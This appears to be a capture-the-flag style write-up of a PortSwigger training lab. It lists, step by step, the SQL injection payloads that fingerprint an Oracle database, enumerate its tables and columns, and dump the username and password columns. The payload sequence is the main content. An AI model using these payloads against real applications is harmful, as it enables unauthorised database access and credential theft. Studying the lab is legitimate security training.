# SQL injection attack, listing the database contents on Oracle
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

Step - 1
--------
'
-
Error
Single Quotes

Step - 2
--------
'--
---
No MySQL

Step - 3
--------
' ORDER BY 3--
--------------
Error
2 Column

Step - 4
--------
' UNION SELECT 'a','a' FROM dual--
----------------------------------
2 String Column

Step - 5
--------
' UNION SELECT 'a',table_name FROM all_tables--
-----------------------------------------------
Table: USERS_JASUOU

Step - 6
--------
' UNION SELECT 'a',column_name FROM all_tab_columns WHERE table_name='USERS_JASUOU'--
-------------------------------------------------------------------------------------
Column: USERNAME_GSFFNH and PASSWORD_DITWXL

Step - 7
--------
' UNION SELECT 'a',USERNAME_GSFFNH || '~' || PASSWORD_DITWXL FROM USERS_JASUOU--
